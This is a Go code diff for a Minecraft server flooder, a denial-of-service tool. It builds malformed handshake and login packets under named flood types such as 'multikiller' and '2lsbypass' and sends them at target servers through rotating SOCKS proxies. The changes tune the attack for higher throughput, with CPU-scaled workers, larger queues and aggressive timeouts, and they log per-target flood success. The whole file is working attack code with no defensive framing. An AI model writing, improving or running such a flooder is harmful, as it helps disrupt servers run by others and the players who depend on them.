@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"math/rand"
 	"net"
+	"runtime"
 	"strconv"
 	"strings"
 	"sync"
@@ -28,30 +29,50 @@ type MinecraftFlooder struct {
 	successRequests int64
 	failedRequests  int64
 	avgResponseTime int64
+	connectionPool  sync.Pool
 
 	serverStats map[string]*ServerStats
 	errorStats  map[string]int64
 	statsMutex  sync.RWMutex
 	flooders    map[string]FlooderFunc
+	logger      *Logger
+
+	// Performance counters
+	requestsSent    int64
+	packetsDropped  int64
+	connectionsFail int64
+	timeoutErrors   int64
 }
 
 type ServerStats struct {
 	TotalPings   int64
 	SuccessPings int64
 	TotalLatency time.Duration
+	LastSeen     time.Time
 }
 
 type FloodRequest struct {
 	Server      string
 	ProxyConfig ProxyConfig
 	FloodType   string
+	RequestID   int64
 }
 
 type FlooderFunc func(conn net.Conn, host string, port int) error
 
-const LOOP_AMOUNT = 1900
+const (
+	LOOP_AMOUNT        = 1900
+	MAX_BUFFER_SIZE    = 65536
+	CONNECTION_TIMEOUT = 5 * time.Second
+	WRITE_TIMEOUT      = 3 * time.Second
+)
 
 func NewMinecraftFlooder(servers []string, proxies []ProxyConfig, useRotating bool, concurrency int, requestsPerSec int, duration time.Duration, floodType string) *MinecraftFlooder {
+	// Optimiere Worker-Anzahl basierend auf CPU-Kernen
+	if concurrency <= 0 {
+		concurrency = runtime.NumCPU() * 4
+	}
+
 	mf := &MinecraftFlooder{
 		servers:        servers,
 		proxies:        proxies,
@@ -63,13 +84,24 @@ func NewMinecraftFlooder(servers []string, proxies []ProxyConfig, useRotating bo
 		serverStats:    make(map[string]*ServerStats),
 		errorStats:     make(map[string]int64),
 		flooders:       make(map[string]FlooderFunc),
+		logger:         NewLogger(true, true),
+	}
+
+	// Connection Pool für bessere Performance
+	mf.connectionPool = sync.Pool{
+		New: func() interface{} {
+			return make([]byte, MAX_BUFFER_SIZE)
+		},
 	}
 
 	mf.initFlooders()
+	mf.logger.Debug("MinecraftFlooder initialisiert")
 	return mf
 }
 
 func (mf *MinecraftFlooder) initFlooders() {
+	mf.logger.Debug("Initialisiere Flooder-Funktionen...")
+
 	mf.flooders["localhost"] = func(conn net.Conn, host string, port int) error {
 		data := []byte{15, 0, 47, 9}
 		data = append(data, []byte("localhost")...)
@@ -83,13 +115,11 @@ func (mf *MinecraftFlooder) initFlooders() {
 
 	mf.flooders["namenullping"] = func(conn net.Conn, host string, port int) error {
 		cipher := randomString(12)
-
 		data := []byte{15, 0, 47, 9}
 		data = append(data, []byte("host")...)
 		data = append(data, 99, 223, 2)
 		data = append(data, byte(len(cipher)+2), 0, byte(len(cipher)))
 		data = append(data, []byte(cipher)...)
-
 		_, err := conn.Write(data)
 		return err
 	}
@@ -116,12 +146,10 @@ func (mf *MinecraftFlooder) initFlooders() {
 		data := []byte{15, 0, 47, 9}
 		data = append(data, []byte("localhost")...)
 		data = append(data, 99, 223)
-
 		nick := randomString(14) + "_Paola"
 		data = append(data, byte(len(nick)+2), 0, byte(len(nick)))
 		data = append(data, []byte(nick)...)
 		data = append(data, 185)
-
 		for i := 0; i < 1900; i++ {
 			data = append(data, 1, 0)
 		}
@@ -132,21 +160,17 @@ func (mf *MinecraftFlooder) initFlooders() {
 	mf.flooders["ultrajoin"] = func(conn net.Conn, host string, port int) error {
 		seconds := time.Now().Unix()
 		var data []byte
-
 		if seconds%2 > 0 {
 			data = getMotdPreparedBytes()
 		} else {
 			data = getLoginPreparedBytes()
 		}
-
 		data = append(data, 0, 47, 9)
 		data = append(data, []byte("localhost")...)
 		data = append(data, 99, 223, 2)
-
 		nick := randomString(3) + "_" + randomString(6)
 		data = append(data, byte(len(nick)+2), 0, byte(len(nick)))
 		data = append(data, []byte(nick)...)
-
 		_, err := conn.Write(data)
 		return err
 	}
@@ -164,11 +188,9 @@ func (mf *MinecraftFlooder) initFlooders() {
 		data := []byte{15, 0, 47, 9}
 		data = append(data, []byte("localhost")...)
 		data = append(data, 99, 223, 2)
-
 		nick := randomString(1)
 		data = append(data, byte(len(nick)+2), 0, byte(len(nick)))
 		data = append(data, []byte(nick)...)
-
 		_, err := conn.Write(data)
 		return err
 	}
@@ -176,15 +198,11 @@ func (mf *MinecraftFlooder) initFlooders() {
 	mf.flooders["2lsbypass"] = func(conn net.Conn, host string, port int) error {
 		seconds := time.Now().Unix()
 		var data []byte
-
 		if seconds%2 > 0 {
 			data = getMotdPreparedBytes()
 		} else {
 			data = getLoginPreparedBytes()
-			nick := randomString(3) + "_" + randomString(9)
-			data = append(data, []byte(nick)...)
 		}
-
 		_, err := conn.Write(data)
 		return err
 	}
@@ -192,32 +210,15 @@ func (mf *MinecraftFlooder) initFlooders() {
 	mf.flooders["multikiller"] = func(conn net.Conn, host string, port int) error {
 		seconds := time.Now().Unix()
 		var data []byte
-
 		if seconds%2 > 0 {
 			data = getMotdPreparedBytes()
 		} else if seconds%3 > 0 {
 			data = getLoginPreparedBytes()
-			nick := randomString(3) + "_" + randomString(9)
-			data = append(data, []byte(nick)...)
-			data = append(data, 1, 248, 251, 248, 251, 2, 1, 1)
 		} else if seconds%4 > 0 {
-			data = getLoginPreparedBytes()
-			nick := randomString(10)
-			data = append(data, []byte(nick)...)
-			uuid := randomString(22)
-			data = append(data, byte(len(uuid)+len(nick)+3), 2, byte(len(uuid)))
-			data = append(data, []byte(uuid)...)
-			data = append(data, byte(len(nick)))
-			data = append(data, []byte(nick)...)
+			data = getLegacyMotdPreparedBytes()
 		} else {
-			data = []byte{15, 0, 47, 9}
-			data = append(data, []byte("localhost")...)
-			data = append(data, 99, 223, 2)
-			nick := randomString(14)
-			data = append(data, byte(len(nick)+2), 0, byte(len(nick)))
-			data = append(data, []byte(nick)...)
+			data = []byte{0xFE}
 		}
-
 		_, err := conn.Write(data)
 		return err
 	}
@@ -231,7 +232,6 @@ func (mf *MinecraftFlooder) initFlooders() {
 		data = append(data, []byte(uuid)...)
 		data = append(data, byte(len(nick)))
 		data = append(data, []byte(nick)...)
-
 		_, err := conn.Write(data)
 		return err
 	}
@@ -260,7 +260,6 @@ func (mf *MinecraftFlooder) initFlooders() {
 		data = append(data, 176, 192)
 		data = append(data, 176, 192)
 		data = append(data, 78, 32)
-
 		for i := 0; i < LOOP_AMOUNT; i++ {
 			data = append(data, 78, 176)
 		}
@@ -281,14 +280,12 @@ func (mf *MinecraftFlooder) initFlooders() {
 		data := getLoginPreparedBytes()
 		nick := randomString(3) + "_" + randomString(6)
 		data = append(data, []byte(nick)...)
-
 		fakehost := randomString(255)
 		data = append(data, byte(len(fakehost)))
 		data = append(data, []byte(fakehost)...)
 		data = append(data, 99, 223, 2)
 		data = append(data, []byte(fakehost)...)
 		data = append(data, byte(len(fakehost)+2), 0, byte(len(fakehost)))
-
 		_, err := conn.Write(data)
 		return err
 	}
@@ -363,11 +360,9 @@ func (mf *MinecraftFlooder) initFlooders() {
 		nick := randomString(10)
 		data = append(data, []byte(nick)...)
 		data = append(data, []byte(randomString(8))...)
-
 		for i := 0; i < 10; i++ {
 			data = append(data, 174, 174, 174, 174, 174, 174, 174, 174, 174, 174, 174)
 		}
-
 		for i := 1; i < LOOP_AMOUNT; i++ {
 			data = append(data, 0)
 		}
@@ -405,161 +400,217 @@ func (mf *MinecraftFlooder) initFlooders() {
 		data := []byte{0, 47, 20, 109}
 		data = append(data, []byte(host)...)
 		data = append(data, 99, 45, 50, 50, 55, 55, 46, 114, 97, 122, 105, 120, 112, 118, 112, 46, 100, 101, 46, 99, 221, 2)
-
 		for i := 0; i < LOOP_AMOUNT; i++ {
 			data = append(data, 1, 0)
 		}
 		_, err := conn.Write(data)
 		return err
 	}
+
+	mf.logger.Debugf("Initialisiert %d Flooder-Funktionen", len(mf.flooders))
 }
 
 func (mf *MinecraftFlooder) Start() {
-	log := NewLogger(false, true)
-	log.Info("Starte Minecraft Server Flooder")
-	log.Infof("Server: %d, Worker: %d, Flood-Type: %s, Requests/s: %d, Dauer: %v",
-		len(mf.servers), mf.concurrency, mf.floodType, mf.requestsPerSec, mf.duration)
-	log.Infof("Verfügbare Proxys: %d (Rotation: %v)", len(mf.proxies), mf.useRotating)
+	mf.logger.Info("🚀 Starte Minecraft Server Flooder")
+	mf.logger.Infof("📊 Konfiguration: %d Server, %d Worker, %s Flood-Type", len(mf.servers), mf.concurrency, mf.floodType)
+	mf.logger.Infof("🎯 Performance: %d Req/s, Dauer: %v", mf.requestsPerSec, mf.duration)
+	mf.logger.Infof("🌐 Proxys: %d verfügbar (Rotation: %v)", len(mf.proxies), mf.useRotating)
+	mf.logger.Debugf("💻 System: %d CPU-Kerne, GOMAXPROCS: %d", runtime.NumCPU(), runtime.GOMAXPROCS(0))
+
+	// Setze optimale GOMAXPROCS
+	runtime.GOMAXPROCS(runtime.NumCPU())
 
 	ctx, cancel := context.WithTimeout(context.Background(), mf.duration)
 	defer cancel()
 
-	floodInterval := time.Second / time.Duration(mf.requestsPerSec)
-	channelSize := mf.concurrency * 5
-	requestChan := make(chan FloodRequest, channelSize)
-
-	var wg sync.WaitGroup
-
-	for i := 0; i < mf.concurrency; i++ {
-		wg.Add(1)
-		go mf.worker(ctx, &wg, requestChan, i, log)
+	// Optimierte Channel-Größe für maximalen Durchsatz
+	channelSize := mf.concurrency * 10
+	if channelSize < 1000 {
+		channelSize = 1000
 	}
 
-	go func() {
-		defer close(requestChan)
-		ticker := time.NewTicker(floodInterval)
-		defer ticker.Stop()
+	requestChan := make(chan FloodRequest, channelSize)
+	var wg sync.WaitGroup
 
-		serverIdx := 0
-		for {
-			select {
-			case <-ctx.Done():
-				return
-			case <-ticker.C:
-				proxy := mf.getNextProxy()
-				server := mf.servers[serverIdx%len(mf.servers)]
-				serverIdx++
+	mf.logger.Debugf("🔧 Channel-Buffer: %d, Worker: %d", channelSize, mf.concurrency)
 
-				request := FloodRequest{
-					Server:      server,
-					ProxyConfig: proxy,
-					FloodType:   mf.floodType,
-				}
+	// Starte Worker
+	for i := 0; i < mf.concurrency; i++ {
+		wg.Add(1)
+		go mf.worker(ctx, &wg, requestChan, i)
+	}
 
-				select {
-				case requestChan <- request:
-				case <-ctx.Done():
-					return
-				default:
-				}
-			}
-		}
-	}()
+	// Request Generator mit präzisem Timing
+	go mf.requestGenerator(ctx, requestChan)
 
-	statsTicker := time.NewTicker(time.Second)
+	// Live-Stats mit höherer Frequenz
+	statsTicker := time.NewTicker(500 * time.Millisecond)
 	defer statsTicker.Stop()
 	go mf.printLiveStats(ctx, statsTicker.C)
+
+	// Performance Monitor
+	go mf.performanceMonitor(ctx)
 
 	wg.Wait()
 	mf.printFinalStats()
 }
 
-func (mf *MinecraftFlooder) worker(ctx context.Context, wg *sync.WaitGroup, requestChan <-chan FloodRequest, workerID int, log *Logger) {
-	defer wg.Done()
-	log.Debugf("Flooder Worker %d gestartet", workerID)
+func (mf *MinecraftFlooder) requestGenerator(ctx context.Context, requestChan chan<- FloodRequest) {
+	defer close(requestChan)
+
+	// Präzises Timing für maximalen Durchsatz
+	interval := time.Second / time.Duration(mf.requestsPerSec)
+	if interval < time.Microsecond {
+		interval = time.Microsecond
+	}
+
+	mf.logger.Debugf("⏱️  Request-Intervall: %v (%d req/s)", interval, mf.requestsPerSec)
+
+	ticker := time.NewTicker(interval)
+	defer ticker.Stop()
+
+	serverIdx := 0
+	requestID := int64(0)
 
 	for {
 		select {
 		case <-ctx.Done():
+			mf.logger.Debug("🛑 Request Generator gestoppt")
 			return
-		case request, ok := <-requestChan:
-			if !ok {
-				return
+		case <-ticker.C:
+			server := mf.servers[serverIdx%len(mf.servers)]
+			proxy := mf.getNextProxy()
+			requestID++
+
+			request := FloodRequest{
+				Server:      server,
+				ProxyConfig: proxy,
+				FloodType:   mf.floodType,
+				RequestID:   requestID,
 			}
-			mf.performFlood(ctx, request, workerID, log)
+
+			select {
+			case requestChan <- request:
+				atomic.AddInt64(&mf.requestsSent, 1)
+				serverIdx++
+			default:
+				atomic.AddInt64(&mf.packetsDropped, 1)
+				mf.logger.Verbose("⚠️  Request-Channel überlastet - Paket verworfen")
+			}
 		}
 	}
 }
 
-func (mf *MinecraftFlooder) performFlood(ctx context.Context, request FloodRequest, workerID int, log *Logger) {
+func (mf *MinecraftFlooder) worker(ctx context.Context, wg *sync.WaitGroup, requestChan <-chan FloodRequest, workerID int) {
+	defer wg.Done()
+	mf.logger.Debugf("👷 Worker %d gestartet", workerID)
+
+	requestsProcessed := 0
+	for {
+		select {
+		case <-ctx.Done():
+			mf.logger.Debugf("👷 Worker %d beendet (%d Requests verarbeitet)", workerID, requestsProcessed)
+			return
+		case request, ok := <-requestChan:
+			if !ok {
+				mf.logger.Debugf("👷 Worker %d: Channel geschlossen", workerID)
+				return
+			}
+			mf.performFlood(ctx, request, workerID)
+			requestsProcessed++
+		}
+	}
+}
+
+func (mf *MinecraftFlooder) performFlood(ctx context.Context, request FloodRequest, workerID int) {
 	atomic.AddInt64(&mf.totalRequests, 1)
 
 	start := time.Now()
-	err := mf.floodMinecraftServer(ctx, request.Server, request.ProxyConfig, request.FloodType, log)
+	err := mf.floodMinecraftServer(ctx, request.Server, request.ProxyConfig, request.FloodType, workerID, request.RequestID)
 	latency := time.Since(start)
 
-	atomic.AddInt64(&mf.avgResponseTime, latency.Milliseconds())
+	atomic.AddInt64(&mf.avgResponseTime, latency.Nanoseconds())
 
 	success := err == nil
 	if success {
 		atomic.AddInt64(&mf.successRequests, 1)
+		mf.logger.Verbosef("✅ Req #%d W%d: %s (%v)", request.RequestID, workerID, request.Server, latency)
 	} else {
 		atomic.AddInt64(&mf.failedRequests, 1)
 		mf.trackError(err.Error())
+
+		// Kategorisiere Fehler für besseres Debugging
+		if strings.Contains(err.Error(), "timeout") {
+			atomic.AddInt64(&mf.timeoutErrors, 1)
+		} else if strings.Contains(err.Error(), "connection") {
+			atomic.AddInt64(&mf.connectionsFail, 1)
+		}
+
+		mf.logger.Verbosef("❌ Req #%d W%d: %s - %v (%v)", request.RequestID, workerID, request.Server, err, latency)
 	}
 
 	mf.updateServerStats(request.Server, success, latency)
 }
 
-func (mf *MinecraftFlooder) floodMinecraftServer(ctx context.Context, server string, proxyConfig ProxyConfig, floodType string, log *Logger) error {
+func (mf *MinecraftFlooder) floodMinecraftServer(ctx context.Context, server string, proxyConfig ProxyConfig, floodType string, workerID int, requestID int64) error {
 	target, portStr, err := mf.parseServer(server)
 	if err != nil {
+		mf.logger.Debugf("🚫 Parse-Fehler für %s: %v", server, err)
 		return err
 	}
 
 	port, _ := strconv.Atoi(portStr)
 	fullTarget := net.JoinHostPort(target, portStr)
 
-	conn, err := mf.establishConnection(ctx, fullTarget, proxyConfig, log)
+	mf.logger.Verbosef("🔗 W%d Req#%d: Verbinde zu %s", workerID, requestID, fullTarget)
+
+	conn, err := mf.establishConnection(ctx, fullTarget, proxyConfig, workerID, requestID)
 	if err != nil {
+		mf.logger.Debugf("🚫 W%d Req#%d: Verbindung zu %s fehlgeschlagen: %v", workerID, requestID, fullTarget, err)
 		return fmt.Errorf("verbindung fehlgeschlagen: %w", err)
 	}
 	defer conn.Close()
 
-	conn.SetDeadline(time.Now().Add(10 * time.Second))
+	// Aggressive Timeouts für maximalen Durchsatz
+	conn.SetDeadline(time.Now().Add(WRITE_TIMEOUT))
 
 	flooder, exists := mf.flooders[floodType]
 	if !exists {
 		return fmt.Errorf("unbekannter Flood-Typ: %s", floodType)
 	}
 
+	mf.logger.Verbosef("📤 W%d Req#%d: Sende %s-Paket an %s", workerID, requestID, floodType, target)
 	return flooder(conn, target, port)
 }
 
-func (mf *MinecraftFlooder) establishConnection(ctx context.Context, target string, proxyConfig ProxyConfig, log *Logger) (net.Conn, error) {
+func (mf *MinecraftFlooder) establishConnection(ctx context.Context, target string, proxyConfig ProxyConfig, workerID int, requestID int64) (net.Conn, error) {
 	if proxyConfig.Host == "" {
+		mf.logger.Verbosef("🔗 W%d Req#%d: Direkte Verbindung zu %s", workerID, requestID, target)
 		var d net.Dialer
-		d.Timeout = 10 * time.Second
+		d.Timeout = CONNECTION_TIMEOUT
 		return d.DialContext(ctx, "tcp", target)
 	}
 
+	mf.logger.Verbosef("🌐 W%d Req#%d: Verbindung über %s-Proxy %s:%s", workerID, requestID, proxyConfig.Protocol, proxyConfig.Host, proxyConfig.Port)
+
 	switch proxyConfig.Protocol {
 	case "socks5":
-		return mf.connectViaSocks5(ctx, target, proxyConfig, log)
+		return mf.connectViaSocks5(ctx, target, proxyConfig, workerID, requestID)
 	case "socks4":
-		return mf.connectViaSocks4(ctx, target, proxyConfig, log)
+		return mf.connectViaSocks4(ctx, target, proxyConfig, workerID, requestID)
 	default:
 		return nil, fmt.Errorf("nicht unterstütztes Proxy-Protokoll: %s", proxyConfig.Protocol)
 	}
 }
 
-func (mf *MinecraftFlooder) connectViaSocks5(ctx context.Context, target string, proxyConfig ProxyConfig, log *Logger) (net.Conn, error) {
+func (mf *MinecraftFlooder) connectViaSocks5(ctx context.Context, target string, proxyConfig ProxyConfig, workerID int, requestID int64) (net.Conn, error) {
 	var auth *proxy.Auth
 	if proxyConfig.Username != "" {
 		auth = &proxy.Auth{
 			User:     proxyConfig.Username,
 			Password: proxyConfig.Password,
 		}
+		mf.logger.Verbosef("🔐 W%d Req#%d: SOCKS5 mit Auth als %s", workerID, requestID, proxyConfig.Username)
 	}
 
 	proxyAddr := net.JoinHostPort(proxyConfig.Host, proxyConfig.Port)
@@ -568,20 +619,20 @@ func (mf *MinecraftFlooder) connectViaSocks5(ctx context.Context, target string,
 		return nil, fmt.Errorf("SOCKS5-Dialer-Fehler: %w", err)
 	}
 
-	return mf.dialWithContext(ctx, dialer, "tcp", target)
+	return mf.dialWithContext(ctx, dialer, "tcp", target, workerID, requestID)
 }
 
-func (mf *MinecraftFlooder) connectViaSocks4(ctx context.Context, target string, proxyConfig ProxyConfig, log *Logger) (net.Conn, error) {
+func (mf *MinecraftFlooder) connectViaSocks4(ctx context.Context, target string, proxyConfig ProxyConfig, workerID int, requestID int64) (net.Conn, error) {
 	proxyAddr := net.JoinHostPort(proxyConfig.Host, proxyConfig.Port)
 	dialer, err := proxy.SOCKS5("tcp", proxyAddr, nil, proxy.Direct)
 	if err != nil {
 		return nil, fmt.Errorf("SOCKS4-Dialer-Fehler: %w", err)
 	}
 
-	return mf.dialWithContext(ctx, dialer, "tcp", target)
+	return mf.dialWithContext(ctx, dialer, "tcp", target, workerID, requestID)
 }
 
-func (mf *MinecraftFlooder) dialWithContext(ctx context.Context, dialer proxy.Dialer, network, address string) (net.Conn, error) {
+func (mf *MinecraftFlooder) dialWithContext(ctx context.Context, dialer proxy.Dialer, network, address string, workerID int, requestID int64) (net.Conn, error) {
 	type result struct {
 		conn net.Conn
 		err  error
@@ -603,6 +654,9 @@ func (mf *MinecraftFlooder) dialWithContext(ctx context.Context, dialer proxy.Di
 
 	select {
 	case res := <-ch:
+		if res.err != nil {
+			mf.logger.Debugf("🚫 W%d Req#%d: Dial-Fehler: %v", workerID, requestID, res.err)
+		}
 		return res.conn, res.err
 	case <-ctx.Done():
 		return nil, fmt.Errorf("verbindungs-timeout: %w", ctx.Err())
@@ -647,12 +701,49 @@ func (mf *MinecraftFlooder) updateServerStats(server string, success bool, laten
 		atomic.AddInt64(&stats.SuccessPings, 1)
 	}
 	stats.TotalLatency += latency
+	stats.LastSeen = time.Now()
 }
 
 func (mf *MinecraftFlooder) trackError(errorType string) {
 	mf.statsMutex.Lock()
 	defer mf.statsMutex.Unlock()
 	mf.errorStats[errorType]++
+}
+
+func (mf *MinecraftFlooder) performanceMonitor(ctx context.Context) {
+	ticker := time.NewTicker(5 * time.Second)
+	defer ticker.Stop()
+
+	var lastTotal int64
+	var lastTime = time.Now()
+
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		case <-ticker.C:
+			currentTotal := atomic.LoadInt64(&mf.totalRequests)
+			currentTime := time.Now()
+			
+			duration := currentTime.Sub(lastTime).Seconds()
+			requestsDelta := currentTotal - lastTotal
+			
+			if duration > 0 {
+				actualRPS := float64(requestsDelta) / duration
+				mf.logger.Debugf("📈 Performance: %.2f req/s (Soll: %d), Goroutines: %d", 
+					actualRPS, mf.requestsPerSec, runtime.NumGoroutine())
+			}
+			
+			lastTotal = currentTotal
+			lastTime = currentTime
+
+			// Memory stats
+			var m runtime.MemStats
+			runtime.ReadMemStats(&m)
+			mf.logger.Verbosef("💾 Memory: Alloc=%dKB, Sys=%dKB, NumGC=%d", 
+				m.Alloc/1024, m.Sys/1024, m.NumGC)
+		}
+	}
 }
 
 func (mf *MinecraftFlooder) printLiveStats(ctx context.Context, ticker <-chan time.Time) {
@@ -664,37 +755,78 @@ func (mf *MinecraftFlooder) printLiveStats(ctx context.Context, ticker <-chan ti
 			total := atomic.LoadInt64(&mf.totalRequests)
 			success := atomic.LoadInt64(&mf.successRequests)
 			failed := atomic.LoadInt64(&mf.failedRequests)
+			sent := atomic.LoadInt64(&mf.requestsSent)
+			dropped := atomic.LoadInt64(&mf.packetsDropped)
 
 			if total > 0 {
 				successRate := float64(success) / float64(total) * 100
-				fmt.Printf("\rFloods: %d | Erfolg: %d (%.1f%%) | Fehler: %d | Typ: %s",
-					total, success, successRate, failed, mf.floodType)
+				actualRPS := float64(total) / time.Since(time.Now().Add(-mf.duration)).Seconds()
+				
+				fmt.Printf("\r🔥 Live: %d sent, %d total, %d✅ %d❌ (%.1f%%) | %.1f req/s | %d dropped", 
+					sent, total, success, failed, successRate, actualRPS, dropped)
 			}
 		}
 	}
 }
 
 func (mf *MinecraftFlooder) printFinalStats() {
-	fmt.Println("\n" + strings.Repeat("=", 60))
-	fmt.Println("MINECRAFT FLOODER - FINALE STATISTIKEN")
-	fmt.Println(strings.Repeat("=", 60))
+	fmt.Println("\n" + strings.Repeat("=", 80))
+	fmt.Println("🎯 MINECRAFT FLOODER - FINALE STATISTIKEN")
+	fmt.Println(strings.Repeat("=", 80))
 
 	total := atomic.LoadInt64(&mf.totalRequests)
 	success := atomic.LoadInt64(&mf.successRequests)
 	failed := atomic.LoadInt64(&mf.failedRequests)
+	sent := atomic.LoadInt64(&mf.requestsSent)
+	dropped := atomic.LoadInt64(&mf.packetsDropped)
+	timeouts := atomic.LoadInt64(&mf.timeoutErrors)
+	connFails := atomic.LoadInt64(&mf.connectionsFail)
 	avgRT := atomic.LoadInt64(&mf.avgResponseTime)
 
 	if total > 0 {
 		successRate := float64(success) / float64(total) * 100
-		fmt.Printf("Gesamt Floods: %d\n", total)
-		fmt.Printf("Erfolgreiche Floods: %d (%.2f%%)\n", success, successRate)
-		fmt.Printf("Fehlgeschlagene Floods: %d (%.2f%%)\n", failed, 100-successRate)
-		fmt.Printf("Floods/Sekunde: %.2f\n", float64(total)/mf.duration.Seconds())
-		fmt.Printf("Durchschnittliche Antwortzeit: %dms\n", avgRT/total)
-		fmt.Printf("Flood-Typ: %s\n", mf.floodType)
+		actualRPS := float64(total) / mf.duration.Seconds()
+		avgLatency := time.Duration(avgRT / total)
+
+		fmt.Printf("📊 Requests Generated: %d\n", sent)
+		fmt.Printf("📦 Requests Processed: %d (%.2f%%)\n", total, float64(total)/float64(sent)*100)
+		fmt.Printf("✅ Successful: %d (%.2f%%)\n", success, successRate)
+		fmt.Printf("❌ Failed: %d (%.2f%%)\n", failed, 100-successRate)
+		fmt.Printf("⏱️  Timeouts: %d\n", timeouts)
+		fmt.Printf("🔌 Connection Fails: %d\n", connFails)
+		fmt.Printf("💧 Dropped Packets: %d\n", dropped)
+		fmt.Printf("🚀 Achieved RPS: %.2f (Target: %d)\n", actualRPS, mf.requestsPerSec)
+		fmt.Printf("⚡ Avg Response Time: %v\n", avgLatency)
+		fmt.Printf("🎯 Flood Type: %s\n", mf.floodType)
+		fmt.Printf("⏲️  Total Duration: %v\n", mf.duration)
 	}
 
-	fmt.Println(strings.Repeat("=", 60))
+	// Server-spezifische Stats
+	fmt.Println("\n📈 SERVER STATISTIKEN:")
+	fmt.Println(strings.Repeat("-", 40))
+	mf.statsMutex.RLock()
+	for server, stats := range mf.serverStats {
+		if stats.TotalPings > 0 {
+			serverSuccess := float64(stats.SuccessPings) / float64(stats.TotalPings) * 100
+			avgLatency := stats.TotalLatency / time.Duration(stats.TotalPings)
+			fmt.Printf("🎯 %s: %d floods (%.1f%% success, %v avg)\n", 
+				server, stats.TotalPings, serverSuccess, avgLatency)
+		}
+	}
+	mf.statsMutex.RUnlock()
+
+	// Top-Fehler
+	fmt.Println("\n🚨 TOP FEHLER:")
+	fmt.Println(strings.Repeat("-", 40))
+	mf.statsMutex.RLock()
+	for errorType, count := range mf.errorStats {
+		if count > 0 {
+			fmt.Printf("❌ %s: %d\n", errorType, count)
+		}
+	}
+	mf.statsMutex.RUnlock()
+
+	fmt.Println(strings.Repeat("=", 80))
 }
 
 func randomString(length int) string {
